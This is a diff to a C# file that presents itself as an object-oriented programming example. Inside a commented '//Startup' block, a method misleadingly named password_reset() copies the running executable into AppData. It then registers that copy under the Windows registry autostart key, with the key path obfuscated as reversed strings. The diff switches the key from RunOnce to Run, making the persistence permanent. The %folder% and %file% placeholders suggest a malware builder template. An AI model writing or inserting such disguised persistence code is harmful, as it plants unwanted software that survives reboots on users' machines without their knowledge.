@@ -305,14 +305,14 @@ namespace ObjectOrientedProgrammingWithCSharp
         //Startup   public static void  password_reset()
         //Startup   {
         //Startup       int OwnerDraw  = Conversions.ToInteger("1");
-        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
+        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
         //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
         //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
         //Startup       {
         //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
         //Startup           File.Copy(Application.ExecutablePath, email, true);
         //Startup       }
-        //Startup       Registry.SetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
+        //Startup       Registry.SetValue(Reverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
         //Startup   }
 
 
